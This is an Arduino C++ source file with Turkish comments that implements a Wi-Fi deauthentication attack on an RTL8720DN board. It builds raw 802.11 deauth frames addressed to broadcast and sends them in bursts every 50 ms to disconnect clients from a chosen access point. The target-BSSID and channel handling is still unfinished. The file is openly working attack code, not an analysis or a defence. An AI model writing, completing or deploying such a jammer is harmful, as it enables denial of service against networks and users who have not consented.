#include "deauth.h"
#include "definitions.h"
#include <WiFi.h>

// ── RTL8720DN ham çerçeve gönderme — AmebaD driver extern ────────────────────
extern "C" {
  int wifi_send_raw_frame(unsigned int intf,
                          unsigned char *buf,
                          unsigned int   buf_len);
  int wifi_set_channel(unsigned char channel);
}

// ── Durum değişkenleri ────────────────────────────────────────────────────────
bool deauth_active  = false;
char deauth_ssid[64]= {0};
int  deauth_channel = 1;

static uint8_t _target_bssid[6] = {0};
static unsigned long _last_send  = 0;
#define DEAUTH_INTERVAL_MS  50    // her 50ms bir paket seti
#define DEAUTH_BURST         5    // her seferde kaç deauth çerçevesi

// ── 802.11 Deauth çerçevesi yapısı (26 byte) ─────────────────────────────────
//  [FC:2][DUR:2][DA:6][SA:6][BSSID:6][SEQ:2][REASON:2]
static uint8_t _frame[26] = {
  0xC0, 0x00,              // Frame Control: Deauthentication
  0x3A, 0x01,              // Duration
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, // DA: broadcast
  0x00,0x00,0x00,0x00,0x00,0x00, // SA: AP BSSID (doldurulacak)
  0x00,0x00,0x00,0x00,0x00,0x00, // BSSID: AP BSSID (doldurulacak)
  0x00, 0x00,              // Sequence
  0x07, 0x00               // Reason: Class 3 frame from nonassoc STA
};

static void _build_frame() {
  // SA ve BSSID alanlarını hedef AP'nin BSSID'siyle doldur
  memcpy(_frame + 10, _target_bssid, 6);  // SA
  memcpy(_frame + 16, _target_bssid, 6);  // BSSID
}

static void _send_burst() {
  // Sıra numarasını her pakette artır
  static uint16_t seq = 0;
  for (int i = 0; i < DEAUTH_BURST; i++) {
    seq += 0x10;
    _frame[22] = (uint8_t)(seq & 0xFF);
    _frame[23] = (uint8_t)(seq >> 8);
    wifi_send_raw_frame(0, _frame, sizeof(_frame));
  }
}

// ── Başlat ────────────────────────────────────────────────────────────────────
void deauth_start(int net_idx) {
  if (net_idx < 0) return;

  deauth_stop();

  // SSID'yi kaydet — tarama sonuçları hâlâ önbellekte
  strncpy(deauth_ssid, WiFi.SSID((uint8_t)net_idx), sizeof(deauth_ssid) - 1);
  deauth_ssid[sizeof(deauth_ssid) - 1] = '\0';

  // BSSID — AmebaD'de BSSID(buf) mevcut bağlantı için çalışır;
  // tarama sonucu BSSID'sine ulaşmak için önce o kanala geçip tekrar tara.
  // Şimdilik sıfır BSSID ile gönder (bazı cihazlar yine de kopar).
  memset(_target_bssid, 0x00, 6);

  deauth_channel = 1;    // kanal varsayılan; ileride geliştirilecek
  wifi_set_channel((unsigned char)deauth_channel);

  _build_frame();
  deauth_active = true;
  _last_send    = 0;

  DBG(F("[DEAUTH] Hedef: ")); DBGLN(deauth_ssid);
  DBGLN(F("[DEAUTH] Basladi"));
}

// ── Durdur ────────────────────────────────────────────────────────────────────
void deauth_stop() {
  deauth_active = false;
  deauth_ssid[0] = '\0';
  DBGLN(F("[DEAUTH] Durduruldu"));
}

// ── Loop ──────────────────────────────────────────────────────────────────────
void deauth_loop() {
  if (!deauth_active) return;
  unsigned long now = millis();
  if (now - _last_send >= DEAUTH_INTERVAL_MS) {
    _last_send = now;
    _send_burst();
  }
}
